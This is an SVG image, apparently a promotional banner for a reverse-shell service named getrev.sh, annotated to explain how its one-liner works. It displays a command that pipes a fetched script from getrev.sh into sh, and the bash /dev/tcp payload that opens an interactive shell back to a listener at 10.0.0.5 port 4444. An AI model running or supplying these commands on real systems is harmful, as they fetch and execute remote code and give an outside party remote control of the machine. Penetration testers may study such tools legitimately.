<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="750" viewBox="0 0 1200 750" font-family="ui-monospace,'DejaVu Sans Mono',Menlo,Consolas,monospace">
  <rect width="1200" height="750" fill="#0a0d13"/>

  <!-- ── hero: the one-liner you type ────────────────────────────────── -->
  <text x="600" y="272" text-anchor="middle" font-size="44" font-weight="500" letter-spacing="1" xml:space="preserve"><tspan fill="#46d18f">$</tspan><tspan fill="#eef2f7"> curl </tspan><tspan fill="#ff7a2f">getrev.sh</tspan><tspan fill="#69748a">/</tspan><tspan fill="#5eb0ff">10.0.0.5</tspan><tspan fill="#69748a">:</tspan><tspan fill="#5eb0ff">4444</tspan><tspan fill="#69748a"> | </tspan><tspan fill="#46d18f">sh</tspan></text>

  <!-- ── anatomy callouts (drafting leaders → tracked labels) ─────────── -->
  <g font-family="ui-sans-serif,'DejaVu Sans',Arial,sans-serif" font-size="20" font-weight="600" letter-spacing="1.5">
    <circle cx="433" cy="305" r="3.5" fill="#ff7a2f"/>
    <path d="M433 305V350" stroke="#ff7a2f" stroke-width="1.8" opacity="0.7"/>
    <text x="433" y="378" text-anchor="middle" fill="#f0a06a">THE EDGE WORKER</text>

    <path d="M579 307V321H952V307" fill="none" stroke="#5eb0ff" stroke-width="1.8" opacity="0.7"/>
    <path d="M765 321V350" stroke="#5eb0ff" stroke-width="1.8" opacity="0.7"/>
    <text x="765" y="378" text-anchor="middle" fill="#86b8ea">YOUR LISTENER&#160;&#160;IP : PORT</text>

    <circle cx="1061" cy="305" r="3.5" fill="#46d18f"/>
    <path d="M1061 305V350" stroke="#46d18f" stroke-width="1.8" opacity="0.7"/>
    <text x="1061" y="378" text-anchor="middle" fill="#63d3a0">EXECUTES</text>
  </g>

  <!-- ── what the edge returns: the tailored payload ─────────────────── -->
  <text x="600" y="454" text-anchor="middle" font-family="ui-sans-serif,'DejaVu Sans',Arial,sans-serif" font-size="16" font-weight="600" letter-spacing="3" fill="#8892a0">THE EDGE RETURNS, TAILORED TO THE RUNTIME</text>
  <text x="600" y="500" text-anchor="middle" font-size="25" letter-spacing="1" fill="#838ea0" xml:space="preserve">bash -i &gt;&amp; /dev/tcp/<tspan fill="#90b4e6">10.0.0.5</tspan>/<tspan fill="#90b4e6">4444</tspan> 0&gt;&amp;1</text>
</svg>
